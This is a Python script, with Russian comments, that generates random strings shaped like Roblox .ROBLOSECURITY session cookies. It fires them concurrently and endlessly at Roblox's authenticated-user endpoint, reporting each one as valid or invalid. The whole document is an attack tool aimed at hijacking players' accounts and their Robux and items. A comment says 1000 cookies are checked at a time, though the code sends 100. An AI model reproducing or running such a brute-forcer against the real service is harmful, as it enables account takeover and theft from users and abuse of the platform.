import asyncio
import aiohttp
import random

# Функция для генерации случайного кука
def generate_cookie():
    valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    rancookie = ''.join((random.choice(valid_letters) for _ in range(1356)))
    return "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie

# Асинхронная функция для проверки одного кука
async def check_cookie(session, cookie):
    url = 'https://users.roblox.com/v1/users/authenticated'
    cookies = {'.ROBLOSECURITY': cookie}
    
    async with session.get(url, cookies=cookies) as response:
        if "Unauthorized" in await response.text():
            print("Неверный")
        else:
            print("Верный")

# Асинхронная функция для проверки нескольких куков одновременно
async def check_cookies_concurrently(n):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(n):
            cookie = generate_cookie()
            tasks.append(check_cookie(session, cookie))
        await asyncio.gather(*tasks)

# Главная функция для запуска асинхронных задач
async def main():
    while True:
        await check_cookies_concurrently(100)  # Проверяем 1000 куков одновременно

# Точка входа в скрипт
if __name__ == "__main__":
    asyncio.run(main())
